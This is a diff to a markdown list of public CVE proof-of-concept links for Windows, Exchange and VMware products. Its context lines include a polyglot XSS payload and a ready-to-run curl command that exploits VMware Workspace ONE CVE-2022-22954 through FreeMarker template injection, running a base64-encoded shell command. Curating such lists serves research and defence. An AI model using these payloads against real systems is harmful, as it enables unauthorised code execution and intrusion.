@@ -140,6 +140,8 @@ Some CVEs PoCs repos on github or internet.
 - http.sys [CVE-2022-21907](https://github.com/nu11secur1ty/Windows10Exploits/commit/2a69a39a33d78c35f47d9bc3d6bf8d0ae9301266)
 - Group Policy Folder Redirection: [CVE-2021-26887](https://decoder.cloud/2022/04/27/group-policy-folder-redirection-cve-2021-26887/)
 - Unitialized pointer free in RMSRoamingSecurity Remote Code Execution: [CVE-2022-21974](https://github.com/0vercl0k/CVE-2022-21974), [other](https://github.com/0vercl0k/CVE-2022-21971)
+- Sysmon: [CVE-2023-29343](https://github.com/Wh04m1001/CVE-2023-29343)
+- [Proxy-Attackchain](https://github.com/FDlucifer/Proxy-Attackchain): proxylogon & proxyshell & proxyoracle & proxytoken & all exchange server vulns summarization :)
 
 ## macOS/iOS
 
@@ -366,6 +368,7 @@ javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
 - VMware vCenter Server: [CVE-2021-21985](https://github.com/alt3kx/CVE-2021-21985_PoC)
 - Exploit for VMware Workspace ONE Access: [CVE-2022-22954](https://twitter.com/wvuuuuuuuuuuuuu/status/1519476924757778433) ```curl -kv https://192.168.0.240/catalog-portal/ui/oauth/verify -H "Host: lol" -Gd error= --data-urlencode 'deviceUdid=${"freemarker.template.utility.Execute"?new()("bash -c {eval,$({echo,aWQ7dW5hbWUgLWE=}|{base64,-d})}")}'```
   - [POC](https://github.com/sherlocksecurity/VMware-CVE-2022-22954)
+- VMWare vRealize Network Insight Pre-Authenticated RCE: [CVE-2023-20887](https://github.com/sinsinology/CVE-2023-20887)
 - [Unauthenticated Full-Read SSRF in Grafana](https://rhynorater.github.io/CVE-2020-13379-Write-Up): CVE-2020-13379
 - [Cisco Security Manager PoCs](https://gist.github.com/Frycos/8bf5c125d720b3504b4f28a1126e509e)
 - UK NCSC’s alert urges orgs to fix MobileIron: [CVE-2020-15505](https://securityaffairs.co/wordpress/111426/uncategorized/mobileiron-cve-2020-15505-alert.html)
